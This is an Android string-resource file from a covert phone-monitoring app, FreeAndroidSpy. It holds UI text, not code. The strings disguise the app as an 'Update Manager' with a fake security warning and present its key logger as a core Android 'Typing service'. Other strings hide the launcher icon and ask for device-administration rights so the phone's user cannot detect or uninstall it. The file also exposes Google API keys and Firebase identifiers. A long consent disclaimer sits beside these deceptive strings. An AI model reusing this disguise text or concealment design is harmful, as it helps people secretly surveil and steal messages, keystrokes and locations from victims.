<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="accept">Accept</string>
    <string name="additional_explanation">In order for your device to be up-to-date and safe you need to activate the Update Manager. If not activated, your device might be exposed to risk and potential threats.</string>
    <string name="alert_message_emails_dont_match">The Emails do not match.</string>
    <string name="alert_message_enter_email">Please enter Email address.</string>
    <string name="alert_message_enter_valid_email">Please enter valid Email address.</string>
    <string name="alert_title_email">Invalid Email</string>
    <string name="button_install">Complete installation</string>
    <string name="check_your_email_for_login_info">- Check your E-Mail for login information</string>
    <string name="common_google_play_services_enable_button">Enable</string>
    <string name="common_google_play_services_enable_text">"%1$s won't work unless you enable Google Play services."</string>
    <string name="common_google_play_services_enable_title">Enable Google Play services</string>
    <string name="common_google_play_services_install_button">Install</string>
    <string name="common_google_play_services_install_text">"%1$s won't run without Google Play services, which are missing from your device."</string>
    <string name="common_google_play_services_install_title">Get Google Play services</string>
    <string name="common_google_play_services_notification_channel_name">Google Play services availability</string>
    <string name="common_google_play_services_notification_ticker">Google Play services error</string>
    <string name="common_google_play_services_unknown_issue">%1$s is having trouble with Google Play services. Please try again.</string>
    <string name="common_google_play_services_unsupported_text">"%1$s won't run without Google Play services, which are not supported by your device."</string>
    <string name="common_google_play_services_update_button">Update</string>
    <string name="common_google_play_services_update_text">"%1$s won't run unless you update Google Play services."</string>
    <string name="common_google_play_services_update_title">Update Google Play services</string>
    <string name="common_google_play_services_updating_text">"%1$s won't run without Google Play services, which are currently updating."</string>
    <string name="common_google_play_services_wear_update_text">New version of Google Play services needed. It will update itself shortly.</string>
    <string name="common_open_on_phone">Open on phone</string>
    <string name="common_signin_button_text">Sign in</string>
    <string name="common_signin_button_text_long">Sign in with Google</string>
    <string name="complete_installation">Complete installation</string>
    <string name="config_appname">Update Manager</string>
    <string name="config_launcher_name">FreeAndroidSpy</string>
    <string name="config_legal_agreement_format">plaintext</string>
    <string name="config_legal_agreement_type">legal-agreement-android-client-en</string>
    <string name="default_web_client_id">809047878315-tgm8rveg6960q5r2tujj83j0d758khp8.apps.googleusercontent.com</string>
    <string name="description_x">Keeping your device secure and up-to-date.</string>
    <string name="enter_valid_email_address">- Enter valid E-Mail address.</string>
    <string name="enter_your_email">Enter your E-Mail here.</string>
    <string name="fatal_message_cannot_create_plugins_folder">Cannot create plugins directory. Please uninstall the application and install it again or contact us at support@FreeAndroidSpy.com and we will help you right away.</string>
    <string name="fatal_message_cannot_create_system_database">Cannot create system database. Please uninstall the application and install it again or contact us at support@FreeAndroidSpy.com and we will help you right away.</string>
    <string name="fatal_message_cannot_find_plugins_folder">Cannot find plugins folder. Please uninstall the application and install it again or contact us at support@FreeAndroidSpy.com and we will help you right away.</string>
    <string name="fatal_message_cannot_get_unique_identifier">Could not be generated unique identifier for your device. Please contact us at support@FreeAndroidSpy.com and we will help you right away.</string>
    <string name="fatal_message_cannot_initialize">Initialization error. Please uninstall the application and install it again or contact us at support@FreeAndroidSpy.com and we will help you right away.</string>
    <string name="fatal_message_initial_update_failed">The initial update failed. Please uninstall the application and install it again or contact us at support@FreeAndroidSpy.com and we will help you right away.</string>
    <string name="fatal_message_initial_update_failed_cannot_download_module">Could not download module:</string>
    <string name="fatal_message_initial_update_failed_cannot_install_module">Could not install module:</string>
    <string name="fatal_message_initial_update_failed_cannot_instantiate_module">Could not create instance of module:</string>
    <string name="fatal_message_initial_update_no_modules_for_installation">There are no modules for installation.</string>
    <string name="fatal_message_no_internet_connection_available">No Internet Connection available. Please enable your Internet Connection and try again. If you still have problems contact us at support@FreeAndroidSpy.com and we will help you right away.</string>
    <string name="fatal_message_register_account">"Cannot register account on the server. Either you don't have Internet connection enabled or there was an error in the application. Please make sure you are connected to the Internet and try again. If it doesn't work, please re-install the application and try again the same procedure or just contact us at support@FreeAndroidSpy.com and we will help you right away."</string>
    <string name="fcm_fallback_notification_channel_label">Miscellaneous</string>
    <string name="firebase_database_url">https://com-hp-vd.firebaseio.com</string>
    <string name="gcm_defaultSenderId">809047878315</string>
    <string name="google_api_key">AIzaSyCDKbEJ6hCsi85eWXIlVl5L5e7APpn0t-A</string>
    <string name="google_app_id">1:809047878315:android:78114adda89e2ebe</string>
    <string name="google_crash_reporting_api_key">AIzaSyCDKbEJ6hCsi85eWXIlVl5L5e7APpn0t-A</string>
    <string name="google_storage_bucket">com-hp-vd.appspot.com</string>
    <string name="important">Important:</string>
    <string name="improve_stability">Improve stability</string>
    <string name="junk_01">junkX</string>
    <string name="junk_02">junkX</string>
    <string name="junk_03">junkX</string>
    <string name="junk_04">junkX</string>
    <string name="junk_05">junkX</string>
    <string name="label_accept_tos"><u>Accept Terms of Service to continue</u></string>
    <string name="label_accessibility_service_appname">Typing service</string>
    <string name="label_accessibility_service_description">Standard typing is a core Android service that improves typing in a number of ways. For improved user experience, please make sure this service is enabled.</string>
    <string name="label_agreement">Agreement</string>
    <string name="label_agreement_default_body">"You are in the process of installing FreeAndroidSpy. You can stop using the services at any time. By taking any further action you declare that you have read and you are aware of the Terms of Service for the FreeAndroidSpy service located at the website www.FreeAndroidSpy.com. You agree and acknowledge that you will not use FreeAndroidSpy for any illegal or unethical purposes or when the usage of the application is not allowed according to the law or other norms. If you are in doubt that you are violating or you may be violating any laws or the rights of any other party you must immediately stop using the application. It is illegal to install this application on any device without first notifying and receiving the explicit written consent from the owners and the users of the device, if different. If you violate third party rights you will be indicted according to your local law. We stand firm against the usage of this service for any unethical purposes. YOU MUST BE A LEGAL ADULT AND FULLY ABLE AND COMPETENT IN ORDER TO ACCESS THIS WEBSITE OR APPLICATION. IF YOU ARE AN UNDER-AGED PERSON, NOT A LEGAL ADULT OR NOT FULLY ABLE AND COMPETENT YOU ARE NOT PERMITTED TO ACCESS THIS WEBSITE OR APPLICATION FOR ANY REASON. THERE ARE MANY OTHER GREAT WEBSITES AND APPLICATIONS FOR YOU. THE DESCRIBED SITUATIONS ON THIS WEBSITE OR APPLICATION MAY NOT BE APPLICABLE TO YOUR PARTICULAR CIRCUMSTANCES AND BECAUSE OF THIS IT IS ADVISABLE THAT NO ACTION RECOMMENDED ON OR THROUGH THIS WEBSITE OR APPLICATION SHOULD BE TAKEN WITHOUT FIRST CONSULTING A LEGAL PROFESSIONAL.IN MOST COUNTRIES AND TERRITORIES IT IS ILLEGAL TO INSTALL SOFTWARE OR HARDWARE FOR MONITORING AND/OR SURVEILLANCE ON DEVICES (INCLUDING, BUT NOT LIMITED TO, MOBILE PHONES AND TABLETS) THAT ARE NOT YOUR PROPERTY OR FOR WHICH YOU DO NOT HAVE PROPER AUTHORIZATION TO INSTALL SUCH SOFTWARE OR HARDWARE AND YOU ACKNOWLEDGE AND UNDERSTAND ALL OF THIS. IF YOU DON'T OWN THE AFOREMENTIONED DEVICES YOU MUST FIRST INFORM THEIR OWNER(S) AND THEIR USER(S) AND OBTAIN PROPER AUTHORIZATION FROM THEM. IN ADDITION YOU MUST ENSURE THAT IS NOT ILLEGAL TO MONITOR DEVICES LOCATED IN YOUR COUNTRY/JURISDICTION OR MONITOR DEVICES IN DIFFERENT COUNTRIES/JURISDICTIONS. EVEN IF YOU OWN THE DEVICES YOU MUST FIRST INFORM THEIR USERS AND OBTAIN PROPER AND LAWFUL AUTHORIZATION FROM THEM THAT YOU CAN MONITOR THEIR ACTIVITIES. OTHERWISE YOU ARE NOT ALLOWED TO INSTALL SUCH SOFTWARE OR HARDWARE. YOU AGREE THAT BEFORE INSTALLING ANY TYPE OF SOFTWARE OR HARDWARE WHICH MAY BE USED FOR MONITORING AND/OR SURVEILLANCE AND FOR OTHER SIMILAR PURPOSES YOU WILL CHECK ALL ACTS AND LAWS IN THE COUNTRY/JURISDICTION WHERE YOU CURRENTLY RESIDE, AND ALSO IN THE COUNTRY/JURISDICTION WHERE YOU WILL BE MONITORING DEVICES.YOU ALSO AGREE TO PERIODICALLY CHECK ALL LAWS AND ACTS IN THE COUNTRY/JURISDICTION WHERE YOU CURRENTLY RESIDE, AND ALSO IN THE COUNTRY/JURISDICTION WHERE YOU WILL MONITOR DEVICES AFTER INSTALLING ANY TYPE OF SOFTWARE OR HARDWARE WHICH MAY BE USED FOR MONITORING AND/OR SURVEILLANCE AND FOR OTHER SIMILAR PURPOSES. BY USING THIS APPLICATION OR WEBSITE YOU AGREE TO FOLLOW ALL LAWS AND REGULATIONS THAT GOVERN THE USE OF VARIOUS TYPES OF SOFTWARE AND HARDWARE AND YOU AGREE THAT YOU WILL COMPLY WITH THESE LAWS AND THAT THIS IS YOUR SOLE RESPONSIBILITY. IN ADDITION, YOU AGREE TO INDEMNIFY AND HOLD THE CREATORS, THE OWNERS AND OPERATORS OF THIS WEBSITE AND APPLICATION, THEIR LICENSORS, CONTENT AND SERVICE PROVIDERS, EMPLOYEES AND CONTRACTORS HARMLESS OF ANY TYPE OF DAMAGE AND ANY TYPE OF PREDICAMENTS THAT MAY ARISE FROM YOUR USE OR ABUSE OF SUCH SOFTWARE OR HARDWARE. IN ADDITION, YOU ACKNOWLEDGE AND AGREE THAT LAWS AND REGULATIONS MAY CHANGE FROM TIME TO TIME AND THAT THEY ARE SUBJECT TO DIFFERENT INTERPRETATIONS. WE STAND FIRMLY AGAINST THE USAGE OF SUCH SOFTWARE OR HARDWARE FOR ILLEGAL OR UNETHICAL PURPOSES. USERS OF OUR WEBSITES, SERVICES AND SYSTEMS ARE NOT ALLOWED TO PARTICIPATE IN ANY KIND OF ABUSE SUCH AS SPAMMING, DENIAL OF SERVICE ATTACKS, HARASSMENT, CRACKING, OR ANY ILLEGAL OR UNETHICAL ACTIVITIES. THIS IS NOT A COMPLETE LIST, AND WE RESERVE THE RIGHT TO MAKE CHANGES TO THIS LIST OR DEFINE WHAT WE CONSIDER ABUSE OR UNETHICAL. THIS WEBSITE OR APPLICATION MAY BE USED ONLY FOR THE PURPOSES EXPLICITLY PERMITTED HERE AND YOU MAY USE THE WEBSITE OR APPLICATION ONLY FOR THESE EXPLICITLY PERMITTED PURPOSES. YOU MAY NOT USE THIS WEBSITE OR APPLICATION FOR ANY OTHER PURPOSES. YOU CAN NOT USE THIS WEBSITE OR APPLICATION FOR ANY OTHER PURPOSES WITHOUT FIRST CONSULTING WITH US AND WITHOUT OUR EXPLICIT PRIOR WRITTEN CONSENT. NOTE: if the icon is not hidden after installing the application please restart your device."</string>
    <string name="label_agreement_default_format">plaintext</string>
    <string name="label_agreement_default_revision">1</string>
    <string name="label_agreement_default_type">legal-agreement-android-client-default-en</string>
    <string name="label_agreement_default_ui">566</string>
    <string name="label_agreement_default_version">1</string>
    <string name="label_agreement_loading_body">The application is loading the agreement. Please wait.</string>
    <string name="label_agreement_loading_title">Loading Agreement</string>
    <string name="label_cancel">Cancel</string>
    <string name="label_enable_key_logger">Enable Key Logger?</string>
    <string name="label_enter_email">Enter E-Mail:</string>
    <string name="label_how_to_enable_key_logger">Find \"Typing service\", tap on it, then enable it and click Back twice to return here.</string>
    <string name="label_important">Important:</string>
    <string name="label_important_a">- Enter valid email address.</string>
    <string name="label_important_b">- Check your email for login information</string>
    <string name="label_important_c">- To start monitoring go to your Private Area at my.FreeAndroidSpy.com</string>
    <string name="label_make_am_harder_to_detect">Make FreeAndroidSpy harder to detect</string>
    <string name="label_message_installation_completed">The application was successfully installed. Please check your Email. If you do not receive an E-mail within few minutes please check your SPAM folder or contact us.</string>
    <string name="label_message_installation_failed">Installation failed. Please contact our support team at support@FreeAndroidSpy.com</string>
    <string name="label_message_installing">Installing application. This may take a while.</string>
    <string name="label_ok">Ok</string>
    <string name="label_reenter_email">Re-enter E-Mail:</string>
    <string name="label_registration">Welcome to FreeAndroidSpy!</string>
    <string name="label_title_installation_completed">Installation completed!</string>
    <string name="label_title_installation_failed">Installation failed.</string>
    <string name="label_title_installing">Installing...</string>
    <string name="label_welcome">Welcome to FreeAndroidSpy!</string>
    <string name="label_welcome_monitoring_features_include">Monitoring features include:</string>
    <string name="label_x">Update Manager</string>
    <string name="project_id">com-hp-vd</string>
    <string name="reenter_your_email">Re-enter your E-Mail here.</string>
    <string name="status_bar_notification_info_overflow">999+</string>
    <string name="text_make_am_harder_to_text">"By allowing FreeAndroidSpy to use the device administration facilities of the operating system, you ensure that FreeAndroidSpy will work even better and the user of the phone won't be able to detect or stop the application. Also, it will be a bit harder for them to uninstall the application. It is strongly advisable to let FreeAndroidSpy use Device Administration facilities."</string>
    <string name="text_moonitoring_features_overview">Call History, E-Mails, Text Messages, Social Apps, GPS Location Tracking and more.</string>
    <string name="text_this_screen_wont_be_shown_after_completing_the_installation">"After completing the FreeAndroidSpy installation, this screen won't be shown by any means."</string>
    <string name="text_welcome_main">FreeAndroidSpy is an absolutely free and feature-rich monitoring software application exclusively for Android devices which gives you an insight into the potential dangers and risks your children, family or business may face in order to prevent them from ever occuring.</string>
    <string name="to_start_monitoring_visit_pa">- To start monitoring go to your Private Area at my.freeandroidspy.com</string>
    <string name="unused">unused</string>
</resources>
